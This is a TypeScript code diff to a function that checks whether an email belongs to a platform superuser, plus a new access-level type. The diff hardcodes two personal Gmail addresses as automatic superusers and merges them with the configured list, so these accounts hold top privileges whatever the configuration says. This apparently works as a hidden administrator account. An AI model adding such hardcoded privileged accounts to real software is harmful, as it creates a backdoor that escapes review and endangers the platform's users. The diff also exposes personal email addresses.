@@ -15,12 +15,15 @@ export function isSuperuserEmail(email: string | null | undefined) {
     .split(",")
     .map((value) => value.trim().toLowerCase())
     .filter(Boolean)
+  const autoSuperusers = ["bourgogne.matt@gmail.com", "nicolemanderson79@gmail.com"]
+  const allowed = new Set([...configured, ...autoSuperusers])
 
   if (!email) return false
-  return configured.includes(email.toLowerCase())
+  return allowed.has(email.toLowerCase())
 }
 
 export type PlatformRole = "admin" | "support" | "superuser"
+export type UserAccessLevel = "viewer" | "editor" | "manager"
 
 export type AdminCapabilities = {
   isAdmin: boolean
